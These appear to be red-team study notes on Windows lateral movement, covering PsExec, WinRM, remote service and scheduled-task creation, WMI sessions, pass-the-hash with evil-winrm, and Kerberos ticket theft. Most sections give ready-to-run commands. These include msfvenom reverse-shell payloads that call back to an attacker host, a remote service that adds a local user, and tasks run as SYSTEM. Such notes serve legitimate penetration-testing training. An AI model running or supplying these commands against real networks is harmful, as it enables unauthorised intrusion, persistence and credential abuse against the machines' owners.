---
title: Windows lateral movement notes
---

## Process spawning via PsExec
PsExec is Sysinternals tool. It can execute processes remotely on any machine where we can access. PsExec uses SMB protocol (445/TCP). Target account must be a member of _Administrators_ group.

PsExec workflow:

1. Connect to Admin$ share and upload a `psexesvc.exe` service binary.
2. Connect to the Service Control Manager (SCM), run a service named `PSEXESVC` and associate the service binary with `C:\Windows\psexesvc.exe`.
3. Create named pipes to handle stdin/out/err.

```powershell
psexec64.exe \\<target-ip> -u <user> -p <password> -i "cmd.exe"
```

## Process spawning via WinRM
Main purpose of the WinRM protocol is to run PowerShell commands remotely. It can be used to the lateral movement. Target account must be member of the _Remote Management Users_ group.

### Quick method

```powershell
winrs.exe -u:<user> -p:<password> -r:<target-ip> "cmd.exe"
```

### Pure PowerShell method

```powershell
$username = '<user>';
$password = '<password>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername <target-ip> -Credential $credential
Invoke-Command -Computername <target-ip> -Credential $credential -ScriptBlock {whoami}
```

## Command execution via services
Windows services can be used to run arbitrary commands because they execute a command when started. Standard tool for creating a service on remote host is the `sc.exe`. It exploits default ability of Windows services to execute arbitrary commands at the start of the service. Target account must be member of the _Administrators_ group. The victim's OS is in charge of starting the service, so the attacker is not be able to look at the command's output - it's blind attack.

It tries to connect to the Service Control Manager (SVCCTL) throught RPC in two ways:

1. The client will first connect to the Endpoint Mapper (EPM) at port 135 (catalogue of available RPC endpoints) and request information on the SVCCTL service program. The EPM will respond with the IP:PORT of SVCCTL (usually a dynamic port in the range of 49152-65535).
2. The client will try to reach SVCCTL through SMB named pipes on port 445 (SMB) or 139 (SMB over NetBIOS).

> NOTE: The victim's OS is in charge of starting the service, you won't be able to look at the command output.

```bash
# Generate service campatible (exe-service) reverse shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<attacker-ip> LPORT=<attacker-port> -o <output-name.exe>
```

> NOTE: `sc.exe` doesn't allow to specify credentials as a part of the command so it might be necessary to start new shell (with another account) using `runas` command.

```powershell
# Start new shell

# Execute command - create a user
sc.exe \\<target-ip> create <service> binPath= "net user <user> <pass> /add" start= auto
sc.exe \\<target-ip> start <service>

# Stop service
sc.exe \\<target-ip> stop <service>
sc.exe \\<target-ip> delete <service>
```

### Service creation

```powershell
$ServiceName = "<service-name>"
$Command = "<cmd-payload>"

# Run a service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = $ServiceName;
  DisplayName = $ServiceName;
  PathName = $Command;
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Reverse shell
If we try to run a reverse shell using this method, the reverse shell disconnects immediately after execution. Service executables are different to standard `.exe` files, and therefore non-service executables are killed by the service manager almost immediately. `Msfvenom` supports the `exe-service` format, which will encapsulate any payload inside a fully functional service executable, preventing it from getting killed.

## Command execution via scheduled tasks
Scheduled tasks can be created remotely. The `schtasks` tool is available in any Windows installation. The victim's OS is in charge of running the scheduled task, so the attacker is not able to look at the command's output - it's blind attack.

> NOTE: The victim's OS is in charge of running the scheduled task, you won't be able to look at the command output.

```powershell
# Create a task
schtasks /s <target-ip> /RU <user> /create /tn <task-name> /tr <command> /sc ONCE /sd 01/01/1970 /st 00:00 

# Run the task
schtasks /s <target-ip> /run /TN <task-name> 

# Stop the task
schtasks /S <target-ip> /TN <task-name> /DELETE /F
```

## Abusing WMI
WMI allows administrators to perform standard management tasks that attacker can abuse to perform lateral movement. Abusing WMI an attacker is able to remotely create a process or a scheduled task, run a service, install a MSI package.

WMI provides **bunch of ways to perform lateral movement** but first of all WMI session must be established:

### Establishing WMI session

```powershell
$Username = "<target-user>";
$Password = "<target-pass>";
$TargetHost = "<target-ip>";

# Create PSCredential object
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
$Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;

# Establish WMI session
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName $TargetHost -Credential $Credential -SessionOption $Opt -ErrorAction Stop
```

### Reverse shell via MSI packages

```powershell
# Generate MSI reverse shell payload 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4443 -f msi > "<package-name.msi>"

# Install MSI payload
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "<package-path.msi>"; Options = ""; AllUsers = $false}
```

### Command execution (blind)

```powershell
# Execute a command remotely (blind)
$Command = "<cmd-payload>"
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

### Service creation (blind)

```powershell
$ServiceName = "<service-name>"
$Command = "<cmd-payload>"

# Run a service remotely
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name = $ServiceName;
  DisplayName = $ServiceName;
  PathName = $Command;
  ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
  StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE '$ServiceName'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Scheduled task creation (blind)

```powershell
$Command = "<cmd-payload>"
$Args = "<payload-args>"
$TaskName = "<task-name>"

# Run a task
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName $TaskName
Start-ScheduledTask -CimSession $Session -TaskName $TaskName

# Stop the task
Unregister-ScheduledTask -CimSession $Session -TaskName $TaskName
```

## NTLM - Pass-the-Hash
As a result of extracting credentials from a host an attacker might get NTLM hash. Sometimes it can be too hard to crack the hash but it's possible to authenticate with the hash itself.

### Using WinRM

```bash
evil-winrm -i <victim-ip> -u <username> -H <ntml-hash>
```

## Kerberos - Pass-the-Ticket
Sometimes it is possible to extract Kerberos tickets and session keys (both are required) from LSASS memory using e.g. `mimikatz`. Best tickets to steal are TGTs because they can be used to access any service. TGSs are only good for some specific services.
